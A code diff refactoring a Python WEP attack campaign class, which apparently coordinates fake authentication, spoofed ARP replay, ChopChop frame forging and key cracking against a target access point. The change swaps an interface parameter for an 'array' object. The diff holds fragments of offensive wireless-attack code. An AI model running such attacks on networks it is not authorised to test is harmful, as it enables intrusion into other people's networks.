@@ -66,11 +66,11 @@ class WepCampaign(Campaign):
 
     def __init__(
         self,
-        iface,
+        array,
         target: AccessPoint,
         log_callback: Optional[Callable[[str], None]] = None,
     ):
-        super().__init__(ap=target, iface=iface)
+        super().__init__(ap=target, array=array)
         self.target = target
         self._log = log_callback or (lambda _m: None)
         self._active = False
@@ -85,11 +85,11 @@ class WepCampaign(Campaign):
         # ChopChop is a "manufacture an ARP seed" sub-mode the user toggles mid-campaign.
         self.chop: Optional[WepChopChop] = None
 
-        self.fake_auth = WepFakeAuth(iface, target, log_callback=self._log)
+        self.fake_auth = WepFakeAuth(self.iface, target, log_callback=self._log)
         self.replay = WepArpReplay(
-            iface,
+            self.iface,
             target,
-            iface.wep_store,
+            self.array.wep_store,
             # Replays are re-addressed to come FROM our associated fake-auth STA.
             source_mac=self.fake_auth.source_mac,
             # Only burst while we're actually associated.
@@ -121,7 +121,7 @@ class WepCampaign(Campaign):
                 if self.stopped:
                     return
                 await asyncio.sleep(0.2)
-            samples = self.iface.wep_store.crack_samples(self.target.bssid)
+            samples = self.array.wep_store.crack_samples(self.target.bssid)
             for iv, cipher in samples[self._crack_cursor:]:
                 self.cracker.feed(iv, keystream_from_arp_cipher(cipher))
             self._crack_cursor = len(samples)
@@ -178,7 +178,7 @@ class WepCampaign(Campaign):
         self.chop = WepChopChop(
             self.iface,
             self.target,
-            self.iface.wep_store,
+            self.array.wep_store,
             source_mac=self.fake_auth.source_mac,
             on_forged_arp=self._on_chop_success,
             ensure_associated=self.fake_auth.ensure_associated,
@@ -196,7 +196,7 @@ class WepCampaign(Campaign):
     def _on_chop_success(self, forged_frame: bytes) -> None:
         """Chop FORGED a broadcast ARP (from recovered keystream)."""
         self.chop = None
-        self.iface.wep_store.record_broadcast_frame(self.target.bssid, forged_frame)
+        self.array.wep_store.record_broadcast_frame(self.target.bssid, forged_frame)
         self.replay.resume()
 
     @property
